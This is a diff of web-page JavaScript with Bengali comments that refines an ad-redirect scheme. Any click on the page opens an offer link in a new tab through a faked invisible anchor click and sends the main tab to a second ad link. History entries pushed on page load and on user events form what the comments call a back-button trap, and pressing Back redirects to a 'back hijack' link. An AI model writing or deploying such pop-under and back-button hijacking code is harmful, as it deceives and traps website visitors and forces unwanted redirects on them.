@@ -469,7 +469,7 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // ADVANCED POP-UNDER & TAB-UNDER REDIRECT LOGIC
+            // TRUE TAB-UNDER / POP-UNDER REDIRECT LOGIC
             // ════════════════════════════════════════════════════════════
             let isRedirecting = false;
 
@@ -477,27 +477,25 @@
                 if (isRedirecting) return;
                 isRedirecting = true;
 
-                // ব্যাক বাটন হাইজ্যাকিং এর হিস্ট্রি তৈরি করে রাখা
+                // ব্যাক বাটন ট্র্যাপ পুশ
                 pushStateHistory();
 
-                // ১. অ্যাডস লিঙ্ক নতুন ট্যাবে বা পপ-আন্ডার উইন্ডোতে ওপেন করা
-                let popWindow = window.open(REDIRECT_LINK_1, '_blank');
+                // ১. একটি অদৃশ্য ভুয়া অ্যানঙ্কর ট্যাগ তৈরি করে নতুন ট্যাবে টার্গেট অফার খোলার চেষ্টা
+                let a = document.createElement('a');
+                a.href = REDIRECT_LINK_1;
+                a.target = '_blank';
+                a.rel = 'noopener';
                 
-                if (popWindow) {
-                    try {
-                        // নতুন উইন্ডো থেকে ফোকাস সরিয়ে মেইন পেজে রাখা (Pop-under Trick)
-                        popWindow.blur();
-                        window.focus();
-                    } catch(e) {}
-                }
+                // মাউস ক্লিক ইভেন্ট দিয়ে নতুন ট্যাব ওপেন
+                let evt = document.createEvent('MouseEvents');
+                evt.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
+                a.dispatchEvent(evt);
 
-                // ২. ২০০ মিলি-সেকেন্ডের হালকা বাফারিং ডিলে দিয়ে মেইন ট্যাবকে অফার লিঙ্কে নিয়ে যাওয়া
-                setTimeout(function() {
-                    window.location.href = DIRECT_LINK_MAIN;
-                }, 200);
+                // ২. সাথে সাথেই মূল বা আসল ট্যাবটিকে পপ-আন্ডার লিঙ্কে পাঠিয়ে দেওয়া
+                window.location.href = DIRECT_LINK_MAIN;
             }
 
-            // পেজের যে কোনো জায়গায় ক্লিক করলেই ট্রিপল-অ্যাকশন ট্রিগার হবে
+            // পুরো পেজে যেকোনো ক্লিকে ব্যাকগ্রাউন্ড অ্যাড রিডাইরেক্ট হবে
             document.addEventListener('click', function(e) {
                 triggerPopUnder();
             });
@@ -520,16 +518,16 @@
                 }
             }
 
-            // প্রথম পেজ লোডেই হিস্ট্রি পুশ
+            // প্রথম পেজ লোডেই হিস্ট্রি ট্র্যাপ একটিভ করা
             pushStateHistory();
 
-            // ইউজারের কোনো ইন্টারঅ্যাকশন পেলেই হিস্ট্রি ট্র্যাপ শক্তিশালী করা
+            // ইউজার ইন্টারঅ্যাকশনে হিস্ট্রি লক করা
             const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
             userEvents.forEach(evt => {
                 window.addEventListener(evt, setupHijack, { passive: true });
             });
 
-            // ব্যাক বাটন চাপলেই হাইজ্যাক লিঙ্কে রিডাইরেক্ট হবে
+            // ব্যাক বাটন প্রেস করলেই ব্যাক হাইজ্যাক লিঙ্কে পাঠাবে
             window.addEventListener('popstate', function (event) {
                 pushStateHistory();
                 window.location.href = BACK_HIJACK_LINK;
